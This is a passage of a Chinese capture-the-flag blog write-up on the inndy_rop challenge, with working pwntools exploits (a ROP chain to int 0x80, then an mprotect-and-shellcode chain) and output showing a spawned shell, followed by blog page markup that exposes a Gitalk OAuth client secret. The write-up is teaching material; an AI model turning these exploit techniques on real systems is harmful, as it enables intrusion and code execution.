+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806c943</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># int 0x80</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>结果：</p>
+<pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode
+$ whoami
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>
+    <span class="token string">'whoami\n'</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>
+    <span class="token string">'matrix\n'</span>
+matrix
+$  </code></pre>
+<p>从这里学到一个新方法：<a href="https://www.yuque.com/u239977/cbzkn3/sam1zw" target="_blank" rel="noopener">https://www.yuque.com/u239977/cbzkn3/sam1zw</a> 并再次膜拜大佬</p>
+<blockquote>
+<p>mprotect函数：<br>原型：int mprotect(const void *start, size_t len, int prot)<br>参数解释：<br>start：需改写属性的内存中开始地址<br>len：需改写属性的内存长度<br>prot：需要修改为的指定值<br>功能： mprotect()函数可以用来修改一段指定内存区域的保护属性。 他把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。 prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：<br>1）PROT_READ：表示内存段内的内容可写；<br>2）PROT_WRITE：表示内存段内的内容可读；<br>3）PROT_EXEC：表示内存段中的内容可执行；<br>4）PROT_NONE：表示内存段中的内容根本没法访问。<br>注意：指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。<br>prot=7 是可读可写可执行<br>从IDA中可以搜到 这个函数的存在。</p>
+</blockquote>
+<pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> vmmap
+LEGEND<span class="token operator">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA
+ <span class="token number">0x8048000</span>  <span class="token number">0x80e9000</span> r<span class="token operator">-</span>xp    a1000 <span class="token number">0</span>      <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>PWN<span class="token operator">/</span>BUU<span class="token operator">/</span>rop
+ <span class="token number">0x80e9000</span>  <span class="token number">0x80eb000</span> rw<span class="token operator">-</span>p     <span class="token number">2000</span> a0000  <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>PWN<span class="token operator">/</span>BUU<span class="token operator">/</span>rop  （data）
+ <span class="token number">0x80eb000</span>  <span class="token number">0x810f000</span> rw<span class="token operator">-</span>p    <span class="token number">24000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>
+<span class="token number">0xf7ff9000</span> <span class="token number">0xf7ffc000</span> r<span class="token operator">--</span>p     <span class="token number">3000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>
+<span class="token number">0xf7ffc000</span> <span class="token number">0xf7ffe000</span> r<span class="token operator">-</span>xp     <span class="token number">2000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>
+<span class="token number">0xfffdd000</span> <span class="token number">0xffffe000</span> rw<span class="token operator">-</span>p    <span class="token number">21000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>
+pwndbg<span class="token operator">></span> 
+从vmmap可以知道<span class="token number">0x80e9000</span>  <span class="token number">0x80eb000</span>  data段可读可写，所以利用这个mprotect函数再加一个可执行</code></pre>
+<p>然后read函数读取shellcode到这里即可</p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP~"></a>EXP~</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'rop'</span><span class="token punctuation">)</span>
+read_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+mprotect <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>
+data_addr <span class="token operator">=</span> <span class="token number">0x080e9000</span>
+pop3_ret <span class="token operator">=</span> <span class="token number">0x0804ef14</span>
+
+shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./rop'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#sh = remote('node3.buuoj.cn',26186)</span>
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0xc</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop3_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop3_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>结果：</p>
+<pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode
+$ cat flag
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x9</span> bytes<span class="token operator">:</span>
+    <span class="token string">'cat flag\n'</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x25</span> bytes<span class="token operator">:</span>
+    <span class="token string">'cat: flag: No such file or directory\n'</span>
+cat<span class="token operator">:</span> flag<span class="token operator">:</span> No such file or directory
+$  </code></pre>
+
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff;
+        background-color: #22AB38;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff;
+        background-color: #019FE8;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs">
+                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
+                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                    </ul>
+                    <div id="wechat">
+                        <img src="/medias/reward/1.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                    <div id="alipay">
+                        <img src="/medias/reward/2.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('#reward .reward-link').on('click', function () {
+            $('#rewardModal').openModal();
+        });
+
+        $('#rewardModal .close').on('click', function () {
+            $('#rewardModal').closeModal();
+        });
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="http://squarepants0.github.io" class="b-link-green">Matrix</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2020/09/27/inndy-rop-mprotect-han-shu/" class="b-link-green">inndy_rop--mprotect函数</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'aa0bf75cc88de6c0258a',
+        clientSecret: '8ddc9bf71af314ac63d189a5ecb132fac7c0687d',
+        repo: 'Gitalks.github.io',
+        owner: 'squarepants0',
+        admin: "squarepants0",
+        id: '2020-09-27T17-38-24',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/09/27/axb-2019-fmt32/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="axb_2019_fmt32">
+                        
+                        <span class="card-title">axb_2019_fmt32</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">checksecmatrix@ubuntu:~/PWN/BUU$ checksec axb_2019_fmt32
+[*] '/home/matrix/PWN/BUU/axb_2019_fmt32'
+    Arch:     i386-32</div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-09-27
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF-PWN/" class="post-category" target="_blank">
+                                    CTF-PWN
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/BUU-PWN/" target="_blank">
+                        <span class="chip bg-color">BUU-PWN</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/09/27/bjdctf-2nd-secret/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="[BJDCTF 2nd]secret">
+                        
+                        <span class="card-title">[BJDCTF 2nd]secret</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">checksecmatrix@ubuntu:~/PWN/BUU$ checksec secret
+[*] '/home/matrix/PWN/BUU/secret'
+    Arch:     amd64-64-little
+    REL</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-09-27
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF-PWN/" class="post-category" target="_blank">
+                                    CTF-PWN
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/BUU-PWN/" target="_blank">
+                        <span class="chip bg-color">BUU-PWN</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('10')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Matrix<br />'
+            + '作者: IT YUAN<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者Matrix所有，任何形式的转载都请注明出处：https://squarepants0.github.io/。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">73.1k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:2337463603@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2334763603" target="_blank" rel="noopener" class="tooltipped" data-tooltip="QQ联系我: 2334763603" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input" autofocus="">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/js/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+
+</body>
+</html>
